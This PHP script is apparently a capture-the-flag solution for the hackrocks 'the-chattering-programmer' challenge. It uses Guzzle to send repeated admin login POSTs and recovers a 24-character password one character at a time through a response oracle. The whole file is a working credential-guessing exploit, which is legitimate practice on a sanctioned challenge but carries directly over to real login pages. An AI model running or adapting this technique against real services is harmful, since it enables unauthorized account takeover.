<?php 
    require 'vendor/autoload.php';


    use GuzzleHttp\Client;

    $client = new Client();


    $characters= str_split("abc8defghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456790");

    $password = '';

    
    function newResponse($current_password) {
        global $client;
        $response = $client->request('POST', 'https://challenges.hackrocks.com/the-chattering-programmer/login', [
            'form_params' => [
                'login' => 'admin',
                'password' => $current_password
            ],
            'delay' => 250
        ]);
        
        $pos = strpos($response->getBody(),'1');
        return $pos;
    }

    for ($i = 0; $i < 24; $i++) {
        $current_password = '........................';

        foreach ($characters as $character) {
            $current_password[$i] = $character;
            if (newResponse($current_password)) {
                var_dump($current_password);
                $password .= $character;
                break;
            }
        }
    }

    var_dump($password);
